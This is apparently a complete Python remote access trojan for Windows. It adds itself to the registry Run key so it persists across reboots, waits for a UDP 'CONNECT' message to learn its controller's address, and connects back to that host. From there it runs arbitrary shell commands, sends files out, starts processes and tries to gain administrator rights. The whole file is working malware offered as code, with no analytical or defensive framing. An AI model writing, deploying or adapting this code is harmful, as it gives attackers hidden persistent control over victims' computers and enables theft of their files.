from socket import *
from ctypes import wintypes
import subprocess
import base64
import os
import time
import datetime
import sys
import winreg
import ctypes

path = r"Software\Microsoft\Windows\CurrentVersion\Run"
handler = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(handler, "ALPHA", 0, winreg.REG_SZ, f"{os.getcwd()}\\{os.path.basename(__file__)}")
winreg.CloseKey(handler)

# Create "ALPHA" registry key to start this program after the Windows computer boot

class Session:
    def connection(self:dict):
        try:
            s = socket(self["option1"], self["option2"])
            s.connect((self["ip"], self["port"]))
            return s
        except:
            return False
    def receive(self):
        try:
            return base64.b64decode(self.recv(1048576)).decode()
        except:
            return False
    def send(self, data:bytes):
        try:
            data = base64.b64encode(data)
            self.send(data)
            return True
        except:
            return False

Running = True

udp = socket(AF_INET, SOCK_DGRAM)
udp.bind(("", 12345))
while True:
    try:
        data = udp.recvfrom(1024)
        if data[0].decode().startswith("CONNECT:::"):
            Server = data[0].decode().split(":::")[1]
            udp.close()
            break
    except:
        pass

while Running:
    try:
        if Running == False:
            break
        s = Session.connection({"ip" : Server, "port" : 8080, "option1" : AF_INET, "option2" : SOCK_STREAM})
        while True:
            try:
                data = Session.receive(s)
                if data == "close":
                    s.close()
                    break
                elif data.startswith("Run:"):
                    cmd = data[4:]
                    if cmd == "dir":
                        text = ""
                        text += f"  {os.getcwd()} Directory\n\n"
                        for file in os.listdir():
                            if os.path.isdir(file) == True:
                                text += f"{datetime.datetime.fromtimestamp(os.path.getmtime(file))}\t<DIR>\t {file}\n"
                            else:
                                text += f"{datetime.datetime.fromtimestamp(os.path.getmtime(file))}\t\t{os.path.getsize(file)} {file}\n"
                        Session.send(s, text.encode())
                    elif cmd.startswith("cd"):
                        directory = cmd[3:]
                        os.chdir(directory)
                        Session.send(s, os.getcwd().encode())
                    elif cmd.startswith("get"):
                        with open(cmd[4:], "rb") as fp:
                            data = fp.read()
                        fp.close()
                        Session.send(s, data)
                    elif cmd.startswith("start"):
                        target = cmd[6:]
                        os.startfile(target)
                        Session.send(s, f"[+] Complete : Process {target} has been started".encode())
                    elif cmd == "admin":
                        if ctypes.windll.shell32.IsUserAnAdmin() == False:
                            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
                            Session.send(s, "[+] Complete".encode())
                            Running = False
                            break
                        else:
                            Session.send(s, "[-] This session is already in administrator mode".encode())
                    elif cmd == "act lvl":
                        SID_ADMINISTRATORS = "S-1-5-32-544"
                        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
                        GetCurrentProcess = kernel32.GetCurrentProcess
                        GetCurrentProcess.restype = wintypes.HANDLE
                        OpenProcessToken = kernel32.OpenProcessToken
                        OpenProcessToken.argtypes = (wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE))
                        advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
                        GetTokenInformation = advapi32.GetTokenInformation
                        GetTokenInformation.argtypes = (wintypes.HANDLE, ctypes.c_int, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD))
                        token_handle = wintypes.HANDLE()
                        OpenProcessToken(GetCurrentProcess(), 0x0002 | 0x0008, ctypes.byref(token_handle))
                        TokenElevationType = 18
                        token_info = ctypes.c_uint()
                        token_info_size = ctypes.c_ulong()
                        GetTokenInformation(token_handle, TokenElevationType, ctypes.byref(token_info), 4, ctypes.byref(token_info_size))
                        # I HATE MY SELF CAUSE I AM DUMBHEAD USE "ctypes.shell32.IsUserAnAdmin()" UH
                        if token_info.value == 2:
                            Session.send(s, f"[!] Security Level : Administrator [{token_info.value}]".encode())
                        else:
                            Session.send(s, f"[!] Security Level : User [{token_info.value}]".encode())
                    else:
                        result = subprocess.check_output(cmd, text=True)
                        Session.send(s, result.encode())
            except Exception as e:
                try:
                    if Session.send(s, str(e).encode()) == False:
                        s.close()
                        break
                except:
                    s.close()
                    break
    except:
        pass
